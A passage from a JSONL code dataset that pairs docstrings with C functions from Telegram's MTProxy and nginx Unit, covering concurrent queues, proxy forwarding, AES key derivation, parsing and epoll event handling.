(!hptr[1]);\n    } else {\n      NQB = alloc_mpq_block (val, 0, is_small);\n    }    \n    assert (hptr[r] == QB);\n    DBG('D')\n    if (__sync_bool_compare_and_swap (&QB->mqb_next, 0, NQB)) {\n      __sync_bool_compare_and_swap (&MQ->mq_tail, QB, NQB);\n      DBG('E')\n      if (flags & MPQF_STORE_PTR) {\n\thptr[2] = NQB;\n      }\n      hptr[r] = 0;\n      return 0;\n    } else {\n      DBG('F');\n      NQB->mqb_magic = MQ_BLOCK_PREPARED_MAGIC;\n      mpq_push (is_small ? &MqPreparedSmallBlocks : &MqPreparedBlocks, NQB, 0);\n      __sync_fetch_and_add (&mpq_blocks_prepared, 1);\n    }\n  }\n#undef DBG\n}", "path": "MTProxy/common/mp-queue.c", "commit_date": "2018-05-29 00:00:00", "repo_name": "TelegramMessenger/MTProxy", "stars": 4581, "license": "None", "language": "c", "size": 330}
{"docstring": "/* 1 = definitely empty (for some serialization), 0 = possibly non-empty;\n   may invoke mpq_push() to discard empty block */\n", "func_signal": "int mpq_is_empty (struct mp_queue *MQ)", "code": "{\n  void **hptr = &mqb_hazard_ptr[get_this_thread_id()][0];\n  struct mp_queue_block *QB;\n  while (1) {\n    QB = MQ->mq_head;\n    barrier ();\n    *hptr = QB;\n    barrier ();\n    __sync_synchronize ();\n    if (MQ->mq_head != QB) {\n      continue;\n    }\n    barrier();\n    long h = QB->mqb_head;\n    barrier();\n    long t = QB->mqb_tail;\n    barrier();\n    if (!(t & MQN_SAFE)) {\n      *hptr = 0;\n      return t <= h;\n    }\n    t &= MQN_IDX_MASK;\n    if (t > h) {\n      *hptr = 0;\n      return 0;\n    }\n    barrier ();\n    if (!QB->mqb_next) {\n      *hptr = 0;\n      return 1;\n    }\n    if (__sync_bool_compare_and_swap (&MQ->mq_head, QB, QB->mqb_next)) {\n      // want to free QB here, but this is complicated if somebody else holds a pointer\n      if (is_hazard_ptr (QB, 0, 2) <= 1) {\n\tfree_mpq_block (QB);\n      } else {\n\t__sync_fetch_and_add (&mpq_blocks_wasted, 1);\n\t// ... put QB into some GC queue? ...\n\tQB->mqb_magic = MQ_BLOCK_GARBAGE_MAGIC;\n\tmpq_push (QB->mqb_size == MPQ_SMALL_BLOCK_SIZE ? &MqGarbageSmallBlocks : &MqGarbageBlocks, QB, 0);\n      }\n    }\n  }\n  *hptr = 0;\n  return 0;\n}", "path": "MTProxy/common/mp-queue.c", "commit_date": "2018-05-29 00:00:00", "repo_name": "TelegramMessenger/MTProxy", "stars": 4581, "license": "None", "language": "c", "size": 330}
{"docstring": "// ENGINE context\n", "func_signal": "int do_close_in_ext_conn (void *_data, int s_len)", "code": "{\n  assert (s_len == 4);\n  int fd = *(int *)_data;\n  struct ext_connection *Ex = get_ext_connection_by_in_fd (fd);\n  if (Ex) {\n    remove_ext_connection (Ex, 1);\n  }\n  return JOB_COMPLETED;\n}", "path": "MTProxy/mtproto/mtproto-proxy.c", "commit_date": "2019-09-11 00:00:00", "repo_name": "TelegramMessenger/MTProxy", "stars": 4581, "license": "None", "language": "c", "size": 330}
{"docstring": "/* invoke only if sure that nobody else may be using this mp_queue in parallel */\n", "func_signal": "void clear_mp_queue (struct mp_queue *MQ)", "code": "{\n  MODULE_STAT->mpq_active --;\n  assert (MQ->mq_magic == MQ_MAGIC || MQ->mq_magic == MQ_MAGIC_SEM);\n  assert (MQ->mq_head && MQ->mq_tail);\n  struct mp_queue_block *QB = MQ->mq_head, *QBN;\n  for (QB = MQ->mq_head; QB; QB = QBN) {\n    QBN = QB->mqb_next;\n    assert (QB->mqb_next || QB == MQ->mq_tail);\n    QB->mqb_next = 0;\n    free_mpq_block (QB);\n  }\n  MQ->mq_head = MQ->mq_tail = 0;\n  MQ->mq_magic = 0;\n}", "path": "MTProxy/common/mp-queue.c", "commit_date": "2018-05-29 00:00:00", "repo_name": "TelegramMessenger/MTProxy", "stars": 4581, "license": "None", "language": "c", "size": 330}
{"docstring": "// str := nonce_server.nonce_client.client_timestamp.server_ip.client_port.(\"SERVER\"/\"CLIENT\").client_ip.server_port.master_key.nonce_server.[client_ipv6.server_ipv6].nonce_client\n// key := SUBSTR(MD5(str+1),0,12).SHA1(str)\n// iv  := MD5(str+2)\n", "func_signal": "int aes_create_keys (struct aes_key_data *R, int am_client, const char nonce_server[16], const char nonce_client[16], int client_timestamp,\n\t\t     unsigned server_ip, unsigned short server_port, const unsigned char server_ipv6[16], \n\t\t     unsigned client_ip, unsigned short client_port, const unsigned char client_ipv6[16],\n\t\t     const aes_secret_t *key, const unsigned char *temp_key, int temp_key_len)", "code": "{\n  unsigned char str[16+16+4+4+2+6+4+2+MAX_PWD_LEN+16+16+4+16*2 + 256];\n  int i, str_len;\n\n  if (!key->secret_len) {\n    return -1;\n  }\n\n  assert (key->secret_len >= MIN_PWD_LEN && key->secret_len <= MAX_PWD_LEN);\n\n  memcpy (str, nonce_server, 16);\n  memcpy (str + 16, nonce_client, 16);\n  *((int *) (str + 32)) = client_timestamp;\n  *((unsigned *) (str + 36)) = server_ip;\n  *((unsigned short *) (str + 40)) = client_port;\n  memcpy (str + 42, am_client ? \"CLIENT\" : \"SERVER\", 6);\n  *((unsigned *) (str + 48)) = client_ip;\n  *((unsigned short *) (str + 52)) = server_port;\n  memcpy (str + 54, key->secret, key->secret_len);\n  memcpy (str + 54 + key->secret_len, nonce_server, 16);\n  str_len = 70 + key->secret_len;\n\n  if (!server_ip) {\n    assert (!client_ip);\n    memcpy (str + str_len, client_ipv6, 16);\n    memcpy (str + str_len + 16, server_ipv6, 16);\n    str_len += 32;\n  } else {\n    assert (client_ip);\n  }\n\n  memcpy (str + str_len, nonce_client, 16);\n  str_len += 16;\n\n  if (temp_key_len > sizeof (str)) {\n    temp_key_len = sizeof (str);\n  }\n\n  int first_len = str_len < temp_key_len ? str_len : temp_key_len;\n\n  for (i = 0; i < first_len; i++) {\n    str[i] ^= temp_key[i];\n  }\n\n  for (i = first_len; i < temp_key_len; i++) {\n    str[i] = temp_key[i];\n  }\n\n  if (str_len < temp_key_len) {\n    str_len = temp_key_len;\n  }\n\n  md5 (str + 1, str_len - 1, R->write_key);\n  sha1 (str, str_len, R->write_key + 12);\n  md5 (str + 2, str_len - 2, R->write_iv);\n\n  //memcpy (str + 42, !am_client ? \"CLIENT\" : \"SERVER\", 6);\n  str[42] ^= 'C' ^ 'S';\n  str[43] ^= 'L' ^ 'E';\n  str[44] ^= 'I' ^ 'R';\n  str[45] ^= 'E' ^ 'V';\n  str[46] ^= 'N' ^ 'E';\n  str[47] ^= 'T' ^ 'R';\n\n  md5 (str + 1, str_len - 1, R->read_key);\n  sha1 (str, str_len, R->read_key + 12);\n  md5 (str + 2, str_len - 2, R->read_iv);\n\n  memset (str, 0, str_len);\n\n  return 1;\n}", "path": "MTProxy/net/net-crypto-aes.c", "commit_date": "2019-07-09 00:00:00", "repo_name": "TelegramMessenger/MTProxy", "stars": 4581, "license": "None", "language": "c", "size": 330}
{"docstring": "/* ----------- query rpc forwarding ------------ */\n", "func_signal": "int forward_tcp_query (struct tl_in_state *tlio_in, connection_job_t c, conn_target_job_t S, int flags, long long auth_key_id, int remote_ip_port[5], int our_ip_port[5])", "code": "{\n  connection_job_t d = 0;\n  int c_fd = CONN_INFO(c)->fd;\n  struct ext_connection *Ex = get_ext_connection_by_in_fd (c_fd);\n\n  if (CONN_INFO(c)->type == &ct_tcp_rpc_ext_server_mtfront) {\n    flags |= TCP_RPC_DATA(c)->flags & RPC_F_DROPPED;\n    flags |= 0x1000;\n  } else if (CONN_INFO(c)->type == &ct_http_server_mtfront) {\n    flags |= 0x3005;\n  }\n\n  if (Ex && Ex->auth_key_id != auth_key_id) {\n    Ex->auth_key_id = auth_key_id;\n  }\n\n  if (Ex) {\n    assert (Ex->out_fd > 0 && Ex->out_fd < MAX_CONNECTIONS);\n    d = connection_get_by_fd_generation (Ex->out_fd, Ex->out_gen);\n    if (!d || !CONN_INFO(d)->target) {\n      if (d) {\n\tjob_decref (JOB_REF_PASS (d));\n      }\n      remove_ext_connection (Ex, 1);\n      Ex = 0;\n    }\n  }\n\n  if (!d) {\n    int attempts = 5;\n    while (S && attempts --> 0) {\n      rpc_target_choose_random_connections (S, 0, 1, &d);\n      if (d) {\n\tif (TCP_RPC_DATA(d)->extra_int == get_conn_tag (d)) {\n\t  break;\n\t} else {\n\t  job_decref (JOB_REF_PASS (d));\n\t}\n      }\n    }\n    if (!d) {\n      vkprintf (2, \"nowhere to forward user query from connection %d, dropping\\n\", CONN_INFO(c)->fd);\n      dropped_queries++;\n      if (CONN_INFO(c)->type == &ct_tcp_rpc_ext_server_mtfront) {\n\t__sync_fetch_and_or (&TCP_RPC_DATA(c)->flags, RPC_F_DROPPED);\n      }\n      return 0;\n    }\n    if (flags & RPC_F_DROPPED) {\n      // there was at least one dropped inbound packet on this connection, have to close it now instead of forwarding next queries\n      fail_connection (c, -35);\n      return 0;\n    }\n    Ex = create_ext_connection (c, 0, d, auth_key_id);\n  }\n\n  tot_forwarded_queries++;\n\n  assert (Ex);\n\n  vkprintf (3, \"forwarding user query from connection %d~%d (ext_conn_id %llx) into connection %d~%d (ext_conn_id %llx)\\n\", Ex->in_fd, Ex->in_gen, Ex->in_conn_id, Ex->out_fd, Ex->out_gen, Ex->out_conn_id);\n\n  if (proxy_tag_set) {\n    flags |= 8;\n  }\n\n  TLS_START (JOB_REF_PASS (d)); // open tlio_out context\n\n  tl_store_int (RPC_PROXY_REQ);\n  tl_store_int (flags);\n  tl_store_long (Ex->out_conn_id);\n\n  if (remote_ip_port) {\n    tl_store_raw_data (remote_ip_port, 20);\n  } else {\n    if (CONN_INFO(c)->remote_ip) {\n      tl_store_long (0);\n      tl_store_int (-0x10000);\n      tl_store_int (htonl (CONN_INFO(c)->remote_ip));\n    } else {\n      tl_store_raw_data (CONN_INFO(c)->remote_ipv6, 16);\n    }\n    tl_store_int (CONN_INFO(c)->remote_port);\n  }\n\n  if (our_ip_port) {\n    tl_store_raw_data (our_ip_port, 20);\n  } else {\n    if (CONN_INFO(c)->our_ip) {\n      tl_store_long (0);\n      tl_store_int (-0x10000);\n      tl_store_int (htonl (nat_translate_ip (CONN_INFO(c)->our_ip)));\n    } else {\n      tl_store_raw_data (CONN_INFO(c)->our_ipv6, 16);\n    }\n    tl_store_int (CONN_INFO(c)->our_port);\n  }\n\n  if (flags & 12) {\n    int *extra_size_ptr = tl_store_get_ptr (4);\n    int pos = TL_OUT_POS;\n    if (flags & 8) {\n      tl_store_int (TL_PROXY_TAG);\n      tl_store_string (proxy_tag, sizeof (proxy_tag));\n    }\n    if (flags & 4) {\n      tl_store_int (TL_HTTP_QUERY_INFO);\n      tl_store_string (cur_http_origin, cur_http_origin_len >= 0 ? cur_http_origin_len : 0);\n      tl_store_string (cur_http_referer, cur_http_referer_len >= 0 ? cur_http_referer_len : 0);\n      tl_store_string (cur_http_user_agent, cur_http_user_agent_len >= 0 ? cur_http_user_agent_len : 0);\n    }\n    *extra_size_ptr = TL_OUT_POS - pos;\n  }\n\n  int len = TL_IN_REMAINING;\n  assert (tl_copy_through (tlio_in, tlio_out, len, 1) == len);\n\n  TLS_END;   // close tlio_out context\n\n  if (CONN_INFO(c)->type == &ct_http_server_mtfront) {\n    assert (CONN_INFO(c)->pending_queries >= 0);\n    assert (CONN_INFO(c)->pending_queries > 0);\n    assert (CONN_INFO(c)->pending_queries == 1);\n    set_connection_timeout (c, HTTP_MAX_WAIT_TIMEOUT);\n  }\n\n  return 1;\n}", "path": "MTProxy/mtproto/mtproto-proxy.c", "commit_date": "2019-09-11 00:00:00", "repo_name": "TelegramMessenger/MTProxy", "stars": 4581, "license": "None", "language": "c", "size": 330}
{"docstring": "// mode: 0 = find, 1 = delete, 2 = create if not found, 3 = find or create\n", "func_signal": "struct ext_connection *get_ext_connection_by_in_conn_id (int in_fd, int in_gen, long long in_conn_id, int mode, int *created)", "code": "{\n  check_engine_class ();\n  int h = ext_conn_hash (in_fd, in_conn_id);\n  struct ext_connection **prev = &InExtConnectionHash[h], *cur = *prev;\n  for (; cur; cur = *prev) {\n    if (cur->in_fd == in_fd && cur->in_conn_id == in_conn_id) {\n      assert (cur->out_conn_id);\n      if (mode == 0 || mode == 3) {\n\treturn cur;\n      }\n      if (mode != 1) {\n\treturn 0;\n      }\n      if (cur->i_next) {\n\tcur->i_next->i_prev = cur->i_prev;\n\tcur->i_prev->i_next = cur->i_next;\n\tcur->i_next = cur->i_prev = 0;\n      }\n      if (cur->o_next) {\n\tcur->o_next->o_prev = cur->o_prev;\n\tcur->o_prev->o_next = cur->o_next;\n\tcur->o_next = cur->o_prev = 0;\n      }\n      lru_delete_ext_conn (cur);\n      *prev = cur->h_next;\n      cur->h_next = 0;\n      int h = cur->out_conn_id & (EXT_CONN_TABLE_SIZE - 1);\n      assert (OutExtConnections[h].ref == cur);\n      assert (OutExtConnections[h].out_conn_id == cur->out_conn_id);\n      OutExtConnections[h].ref = 0;\n      cur->out_conn_id = 0;\n      memset (cur, 0, sizeof (struct ext_connection));\n      free (cur);\n      ext_connections--;\n      return (void *) -1L;\n    }\n    prev = &(cur->h_next);\n  }\n  if (mode != 2 && mode != 3) {\n    return 0;\n  }\n  assert (ext_connections < EXT_CONN_TABLE_SIZE / 2);\n  cur = calloc (sizeof (struct ext_connection), 1);\n  assert (cur);\n  cur->h_next = InExtConnectionHash[h];\n  InExtConnectionHash[h] = cur;\n  cur->in_fd = in_fd;\n  cur->in_gen = in_gen;\n  cur->in_conn_id = in_conn_id;\n  assert ((unsigned) in_fd < MAX_CONNECTIONS);\n  if (in_fd) {\n    struct ext_connection *H = &ExtConnectionHead[in_fd];\n    if (!H->i_next) {\n      H->i_next = H->i_prev = H;\n    }\n    assert (H->i_next == H);\n    cur->i_next = H;\n    cur->i_prev = H->i_prev;\n    H->i_prev->i_next = cur;\n    H->i_prev = cur;\n  }\n  h = in_conn_id ? lrand48() : in_fd;\n  while (OutExtConnections[h &= (EXT_CONN_TABLE_SIZE - 1)].ref) {\n    h = lrand48();\n  }\n  OutExtConnections[h].ref = cur;\n  cur->out_conn_id = OutExtConnections[h].out_conn_id = (OutExtConnections[h].out_conn_id | (EXT_CONN_TABLE_SIZE - 1)) + 1 + h;\n  assert (cur->out_conn_id);\n  if (created) {\n    ++*created;\n  }\n  ext_connections++;\n  ext_connections_created++;\n  return cur;\n}", "path": "MTProxy/mtproto/mtproto-proxy.c", "commit_date": "2019-09-11 00:00:00", "repo_name": "TelegramMessenger/MTProxy", "stars": 4581, "license": "None", "language": "c", "size": 330}
{"docstring": "// NET-CPU context\n", "func_signal": "int finish_postponed_http_response (void *_data, int len)", "code": "{\n  assert (len == sizeof (connection_job_t));\n  connection_job_t C = *(connection_job_t *)_data;\n  if (!check_job_completion (C)) {\n    assert (CONN_INFO(C)->pending_queries >= 0);\n    assert (CONN_INFO(C)->pending_queries > 0);\n    assert (CONN_INFO(C)->pending_queries == 1);\n    CONN_INFO(C)->pending_queries = 0;\n    --pending_http_queries; \n    // check_conn_buffers (C);\n    http_flush (C, 0);\n  } else {\n    assert (!CONN_INFO(C)->pending_queries);\n  }\n  job_decref (JOB_REF_PASS (C));\n  return JOB_COMPLETED;\n}", "path": "MTProxy/mtproto/mtproto-proxy.c", "commit_date": "2019-09-11 00:00:00", "repo_name": "TelegramMessenger/MTProxy", "stars": 4581, "license": "None", "language": "c", "size": 330}
{"docstring": "/* Semaphore implementation using pthread conditional variable. */\n", "func_signal": "nxt_int_t\nnxt_sem_init(nxt_sem_t *sem, nxt_uint_t count)", "code": "{\n    if (nxt_thread_mutex_create(&sem->mutex) == NXT_OK) {\n\n        if (nxt_thread_cond_create(&sem->cond) == NXT_OK) {\n            sem->count = count;\n            return NXT_OK;\n        }\n\n        nxt_thread_mutex_destroy(&sem->mutex);\n    }\n\n    return NXT_ERROR;\n}", "path": "unit/src/nxt_semaphore.c", "commit_date": "2017-01-17 00:00:00", "repo_name": "nginx/unit", "stars": 5041, "license": "apache-2.0", "language": "c", "size": 12069}
{"docstring": "/* Relink a parent from the node to the subst node. */\n", "func_signal": "nxt_inline void\nnxt_rbtree_parent_relink(nxt_rbtree_node_t *subst, nxt_rbtree_node_t *node)", "code": "{\n    nxt_rbtree_node_t  *parent, **link;\n\n    parent = node->parent;\n    /*\n     * The leaf sentinel's parent can be safely changed here.\n     * See the comment in nxt_rbtree_delete_fixup() for details.\n     */\n    subst->parent = parent;\n    /*\n     * If the node's parent is the root sentinel it is safely changed\n     * because the root sentinel's left child is the tree root.\n     */\n    link = (node == parent->left) ? &parent->left : &parent->right;\n    *link = subst;\n}", "path": "unit/src/nxt_rbtree.c", "commit_date": "2017-05-29 00:00:00", "repo_name": "nginx/unit", "stars": 5041, "license": "apache-2.0", "language": "c", "size": 12069}
{"docstring": "/*\n * nxt_number_parse() returns a double value >= 0 and updates the start\n * argument on success, or returns -1 on failure or -2 on overflow.\n */\n", "func_signal": "double\nnxt_number_parse(const u_char **start, const u_char *end)", "code": "{\n    u_char        c;\n    nxt_bool_t    overflow;\n    nxt_uint_t    integral, frac, power;\n    const u_char  *p;\n\n    static const nxt_uint_t cutoff = NXT_INT_T_MAX / 10;\n    static const nxt_uint_t cutlim = NXT_INT_T_MAX % 10;\n\n    p = *start;\n    integral = 0;\n\n    while (p < end) {\n        c = *p;\n\n        if (c == '.') {\n            goto dot;\n        }\n\n        /* Values below '0' become >= 208. */\n        c = c - '0';\n\n        if (c > 9) {\n            break;\n        }\n\n        overflow = nxt_expect(0, (integral >= cutoff\n                                  && (integral > cutoff || c > cutlim)));\n\n        if (overflow) {\n            return -2;\n        }\n\n        integral = integral * 10 + c;\n\n        p++;\n    }\n\n    if (nxt_fast_path(p != *start)) {\n        *start = p;\n        return integral;\n    }\n\n    /* No value. */\n    return -1;\n\ndot:\n\n    if (nxt_slow_path(p == *start)) {\n        /* No leading digit before dot. */\n        return -1;\n    }\n\n    frac = 0;\n    power = 1;\n\n    for (p++; p < end; p++) {\n        c = *p;\n\n        /* Values below '0' become >= 208. */\n        c = c - '0';\n\n        if (c > 9) {\n            break;\n        }\n\n        overflow = nxt_expect(0, (frac >= cutoff && (frac > cutoff\n                                                     || c > cutlim))\n                                 || power > cutoff);\n\n        if (overflow) {\n            return -2;\n        }\n\n        frac = frac * 10 + c;\n        power *= 10;\n    }\n\n    *start = p;\n\n    return integral + (double) frac / power;\n}", "path": "unit/src/nxt_parse.c", "commit_date": "2017-04-10 00:00:00", "repo_name": "nginx/unit", "stars": 5041, "license": "apache-2.0", "language": "c", "size": 12069}
{"docstring": "/*\n * nxt_epoll_edge_event_conn_io_connect() eliminates the getsockopt()\n * syscall to test pending connect() error.  Although this special\n * interface can work in both edge-triggered and level-triggered\n * modes it is enabled only for the former mode because this mode is\n * available in all modern Linux distributions.  For the latter mode\n * it is required to create additional nxt_epoll_level_event_conn_io\n * with single non-generic connect() interface.\n */\n", "func_signal": "static void\nnxt_epoll_edge_conn_io_connect(nxt_task_t *task, void *obj, void *data)", "code": "{\n    nxt_conn_t                    *c;\n    nxt_event_engine_t            *engine;\n    nxt_work_handler_t            handler;\n    const nxt_event_conn_state_t  *state;\n\n    c = obj;\n\n    state = c->write_state;\n\n    switch (nxt_socket_connect(task, c->socket.fd, c->remote)) {\n\n    case NXT_OK:\n        c->socket.write_ready = 1;\n        handler = state->ready_handler;\n        break;\n\n    case NXT_AGAIN:\n        c->socket.write_handler = nxt_epoll_edge_conn_connected;\n        c->socket.error_handler = nxt_conn_connect_error;\n\n        engine = task->thread->engine;\n        nxt_conn_timer(engine, c, state, &c->write_timer);\n\n        nxt_epoll_enable(engine, &c->socket);\n        c->socket.read = NXT_EVENT_BLOCKED;\n        return;\n\n#if 0\n    case NXT_AGAIN:\n        nxt_conn_timer(engine, c, state, &c->write_timer);\n\n        /* Fall through. */\n\n    case NXT_OK:\n        /*\n         * Mark both read and write directions as ready and try to perform\n         * I/O operations before receiving readiness notifications.\n         * On unconnected socket Linux send() and recv() return EAGAIN\n         * instead of ENOTCONN.\n         */\n        c->socket.read_ready = 1;\n        c->socket.write_ready = 1;\n        /*\n         * Enabling both read and write notifications on a getting\n         * connected socket eliminates one epoll_ctl() syscall.\n         */\n        c->socket.write_handler = nxt_epoll_edge_event_conn_connected;\n        c->socket.error_handler = state->error_handler;\n\n        nxt_epoll_enable(engine, &c->socket);\n        c->socket.read = NXT_EVENT_BLOCKED;\n\n        handler = state->ready_handler;\n        break;\n#endif\n\n    case NXT_ERROR:\n        handler = state->error_handler;\n        break;\n\n    default:  /* NXT_DECLINED: connection refused. */\n        handler = state->close_handler;\n        break;\n    }\n\n    nxt_work_queue_add(c->write_work_queue, handler, task, c, data);\n}", "path": "unit/src/nxt_epoll_engine.c", "commit_date": "2020-04-15 00:00:00", "repo_name": "nginx/unit", "stars": 5041, "license": "apache-2.0", "language": "c", "size": 12069}
{"docstring": "/*\n * epoll changes are batched to improve instruction and data cache\n * locality of several epoll_ctl() calls followed by epoll_wait() call.\n */\n", "func_signal": "static void\nnxt_epoll_change(nxt_event_engine_t *engine, nxt_fd_event_t *ev, int op,\n    uint32_t events)", "code": "{\n    nxt_epoll_change_t  *change;\n\n    nxt_debug(ev->task, \"epoll %d set event: fd:%d op:%d ev:%XD\",\n              engine->u.epoll.fd, ev->fd, op, events);\n\n    if (engine->u.epoll.nchanges >= engine->u.epoll.mchanges) {\n        nxt_epoll_commit_changes(engine);\n    }\n\n    ev->changing = 1;\n\n    change = &engine->u.epoll.changes[engine->u.epoll.nchanges++];\n    change->op = op;\n    change->event.events = events;\n    change->event.data.ptr = ev;\n}", "path": "unit/src/nxt_epoll_engine.c", "commit_date": "2020-04-15 00:00:00", "repo_name": "nginx/unit", "stars": 5041, "license": "apache-2.0", "language": "c", "size": 12069}
{"docstring": "/*\n * nxt_int_parse() returns size_t value >= 0 on success,\n * -1 on failure, and -2 on overflow.\n */\n", "func_signal": "nxt_int_t\nnxt_int_parse(const u_char *p, size_t length)", "code": "{\n    u_char      c;\n    nxt_uint_t  val;\n\n    static const nxt_uint_t cutoff = NXT_INT_T_MAX / 10;\n    static const nxt_uint_t cutlim = NXT_INT_T_MAX % 10;\n\n    if (nxt_fast_path(length != 0)) {\n\n        val = 0;\n\n        do {\n            c = *p++;\n\n            /* Values below '0' become >= 208. */\n            c = c - '0';\n\n            if (nxt_slow_path(c > 9)) {\n                return -1;\n            }\n\n            if (nxt_slow_path(val >= cutoff && (val > cutoff || c > cutlim))) {\n                /* An overflow. */\n                return -2;\n            }\n\n            val = val * 10 + c;\n\n            length--;\n\n        } while (length != 0);\n\n        return val;\n    }\n\n    return -1;\n}", "path": "unit/src/nxt_parse.c", "commit_date": "2017-04-10 00:00:00", "repo_name": "nginx/unit", "stars": 5041, "license": "apache-2.0", "language": "c", "size": 12069}
{"docstring": "/* A trampoline function is called by a thread pool thread. */\n", "func_signal": "static void\nnxt_job_thread_trampoline(nxt_task_t *task, void *obj, void *data)", "code": "{\n    nxt_job_t           *job;\n    nxt_work_handler_t  handler;\n\n    job = obj;\n    handler = (nxt_work_handler_t) data;\n\n    nxt_debug(task, \"%s thread\", job->name);\n\n    if (nxt_slow_path(job->cancel)) {\n        nxt_job_return(task, job, job->abort_handler);\n\n    } else {\n        handler(job->task, job, job->data);\n    }\n}", "path": "unit/src/nxt_job.c", "commit_date": "2017-08-24 00:00:00", "repo_name": "nginx/unit", "stars": 5041, "license": "apache-2.0", "language": "c", "size": 12069}
{"docstring": "/*\n * nxt_size_parse() parses size string with optional K or M units and\n * returns size_t value >= 0 on success, -1 on failure, and -2 on overflow.\n */\n", "func_signal": "ssize_t\nnxt_size_parse(const u_char *p, size_t length)", "code": "{\n    u_char      unit;\n    ssize_t     val, max;\n    nxt_uint_t  shift;\n\n    if (nxt_fast_path(length != 0)) {\n\n        length--;\n\n        /* Upper case. */\n        unit = p[length] & ~0x20;\n\n        switch (unit) {\n\n        case 'G':\n            max = NXT_SIZE_T_MAX >> 30;\n            shift = 30;\n            break;\n\n        case 'M':\n            max = NXT_SIZE_T_MAX >> 20;\n            shift = 20;\n            break;\n\n        case 'K':\n            max = NXT_SIZE_T_MAX >> 10;\n            shift = 10;\n            break;\n\n        default:\n            return nxt_size_t_parse(p, length + 1);\n        }\n\n        val = nxt_size_t_parse(p, length);\n\n        if (nxt_fast_path(val >= 0)) {\n\n            if (nxt_slow_path(val > max)) {\n                /* An overflow. */\n                return -2;\n            }\n\n            val <<= shift;\n        }\n\n        return val;\n    }\n\n    return -1;\n}", "path": "unit/src/nxt_parse.c", "commit_date": "2017-04-10 00:00:00", "repo_name": "nginx/unit", "stars": 5041, "license": "apache-2.0", "language": "c", "size": 12069}
{"docstring": "/* GnuTLS 2.12.0 */\n", "func_signal": "time_t\nnxt_gnutls_time(time_t *tp)", "code": "{\n    time_t        t;\n    nxt_thread_t  *thr;\n\n    thr = nxt_thread();\n    nxt_log_debug(thr->log, \"gnutls time\");\n\n    t = (time_t) nxt_thread_time(thr);\n\n    if (tp != NULL) {\n        *tp = t;\n    }\n\n    return t;\n}", "path": "unit/src/nxt_gnutls.c", "commit_date": "2018-03-05 00:00:00", "repo_name": "nginx/unit", "stars": 5041, "license": "apache-2.0", "language": "c", "size": 12069}
{"docstring": "/* Pop a work from a locked work queue head. */\n", "func_signal": "nxt_work_handler_t\nnxt_locked_work_queue_pop(nxt_locked_work_queue_t *lwq, nxt_task_t **task,\n    void **obj, void **data)", "code": "{\n    nxt_work_t          *work;\n    nxt_work_handler_t  handler;\n\n    handler = NULL;\n\n    nxt_thread_spin_lock(&lwq->lock);\n\n    work = lwq->head;\n\n    if (work != NULL) {\n        *task = work->task;\n\n        *obj = work->obj;\n        nxt_prefetch(*obj);\n\n        *data = work->data;\n        nxt_prefetch(*data);\n\n        lwq->head = work->next;\n\n        if (work->next == NULL) {\n            lwq->tail = NULL;\n        }\n\n        handler = work->handler;\n    }\n\n    nxt_thread_spin_unlock(&lwq->lock);\n\n    return handler;\n}", "path": "unit/src/nxt_work_queue.c", "commit_date": "2018-02-07 00:00:00", "repo_name": "nginx/unit", "stars": 5041, "license": "apache-2.0", "language": "c", "size": 12069}
{"docstring": "/*\n * nxt_off_t_parse() returns nxt_off_t value >= 0 on success,\n * -1 on failure, and -2 on overflow.\n */\n", "func_signal": "nxt_off_t\nnxt_off_t_parse(const u_char *p, size_t length)", "code": "{\n    u_char      c;\n    nxt_uoff_t  val;\n\n    static const nxt_uoff_t cutoff = NXT_OFF_T_MAX / 10;\n    static const nxt_uoff_t cutlim = NXT_OFF_T_MAX % 10;\n\n    if (nxt_fast_path(length != 0)) {\n\n        val = 0;\n\n        do {\n            c = *p++;\n\n            /* Values below '0' become >= 208. */\n            c = c - '0';\n\n            if (nxt_slow_path(c > 9)) {\n                return -1;\n            }\n\n            if (nxt_slow_path(val >= cutoff && (val > cutoff || c > cutlim))) {\n                /* An overflow. */\n                return -2;\n            }\n\n            val = val * 10 + c;\n\n            length--;\n\n        } while (length != 0);\n\n        return val;\n    }\n\n    return -1;\n}", "path": "unit/src/nxt_parse.c", "commit_date": "2017-04-10 00:00:00", "repo_name": "nginx/unit", "stars": 5041, "license": "apache-2.0", "language": "c", "size": 12069}
{"docstring": "/* !(NXT_SETPROCTITLE_ARGV) */\n", "func_signal": "void\nnxt_process_arguments(nxt_task_t *task, char **orig_argv, char ***orig_envp)", "code": "{\n    nxt_process_argv = orig_argv;\n    nxt_process_environ = orig_envp;\n}", "path": "unit/src/nxt_process_title.c", "commit_date": "2017-03-14 00:00:00", "repo_name": "nginx/unit", "stars": 5041, "license": "apache-2.0", "language": "c", "size": 12069}
{"docstring": "/*\n * nxt_str_int_parse() returns nxt_int_t value >= 0 on success,\n * -1 on failure, and -2 on overflow and also updates the 's' argument.\n */\n", "func_signal": "nxt_int_t\nnxt_str_int_parse(nxt_str_t *s)", "code": "{\n    u_char      c, *p;\n    size_t      length;\n    nxt_uint_t  val;\n\n    static const nxt_uint_t cutoff = NXT_INT_T_MAX / 10;\n    static const nxt_uint_t cutlim = NXT_INT_T_MAX % 10;\n\n    length = s->length;\n\n    if (nxt_slow_path(length == 0)) {\n        return -1;\n    }\n\n    p = s->start;\n    val = 0;\n\n    do {\n        c = *p;\n\n        /* Values below '0' become >= 208. */\n        c = c - '0';\n\n        if (c > 9) {\n            break;\n        }\n\n        if (nxt_slow_path(val >= cutoff && (val > cutoff || c > cutlim))) {\n            /* An overflow. */\n            return -2;\n        }\n\n        val = val * 10 + c;\n\n        p++;\n        length--;\n\n    } while (length != 0);\n\n    s->length = length;\n    s->start = p;\n\n    return val;\n}", "path": "unit/src/nxt_parse.c", "commit_date": "2017-04-10 00:00:00", "repo_name": "nginx/unit", "stars": 5041, "license": "apache-2.0", "language": "c", "size": 12069}
{"docstring": "/*\n * nxt_epoll_edge_conn_io_recvbuf() is just wrapper around\n * standard nxt_conn_io_recvbuf() to enforce to read a pending EOF\n * in edge-triggered mode.\n */\n", "func_signal": "static ssize_t\nnxt_epoll_edge_conn_io_recvbuf(nxt_conn_t *c, nxt_buf_t *b)", "code": "{\n    ssize_t  n;\n\n    n = nxt_conn_io_recvbuf(c, b);\n\n    if (n > 0 && c->socket.epoll_eof) {\n        c->socket.read_ready = 1;\n    }\n\n    return n;\n}", "path": "unit/src/nxt_epoll_engine.c", "commit_date": "2020-04-15 00:00:00", "repo_name": "nginx/unit", "stars": 5041, "license": "apache-2.0", "language": "c", "size": 12069}
